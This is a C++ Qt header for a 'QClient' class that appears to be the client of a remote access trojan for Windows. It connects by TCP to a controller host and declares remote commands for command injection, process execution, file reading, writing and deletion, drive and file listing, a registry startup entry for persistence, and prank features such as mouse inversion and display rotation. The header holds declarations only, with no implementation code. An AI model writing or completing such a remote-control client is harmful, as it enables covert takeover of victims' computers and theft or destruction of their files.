#ifndef QCLIENT_H
#define QCLIENT_H

#include <QObject>
#include <QTcpSocket>
#include <QJsonDocument>
#include <QJsonObject>
#include <QFile>
#include <QJsonArray>
#include <QSettings>
#include <QDir>
#include <QDataStream>
#include <windows.h>
#include <QtEndian>
#include <QThread>
#include <QProcess>
#include <QStringList>
#include <QCoreApplication>
#include "qmouseinverter.h"

class QClient : public QObject
{
    Q_OBJECT
public:
    explicit QClient(QString h, qint16 p, QObject *parent = nullptr);
    virtual ~QClient();
	enum Commands { 
		CmdInjection = 0,
		ExecProcess = 1,
		CreateFile = 2,
		ReadFile = 3,
		DeleteFile = 4,
		MouseInvert = 5,
		DisplayRotate = 6,
		OsMessage = 7,
		GetFiles = 8,
		GetDrives = 9,
	};

	//Modify registers
	void addStartup();
	//Process Execution
	void startProcess(const QString &);
	QString runCmdCommand(const QString &);
	//File Handling
	QString readFile(const QString &);
	bool writeFile(const QString &, const QString &);
	bool deleteFile(const QString &);
	//Funny stuff
	void toggleInvertMouse();
	void rotateDisplay();
	void message(const QString &);

	QList<QString> getFiles(const QString &);
	QString getDrives();

	void sendData(const QByteArray &);

signals:

public slots:
    void connected();
    void disconnected();
    void readyRead();
	void tryToConnect();
	void HandleTcpError(QAbstractSocket::SocketError);


private:
    QTcpSocket *sock;
	QString host;
	QString compName;
	qint16 port;
	QThread *thread = Q_NULLPTR;
	QMouseInverter * worker = Q_NULLPTR;
	QString dir;
};

#endif // QCLIENT_H
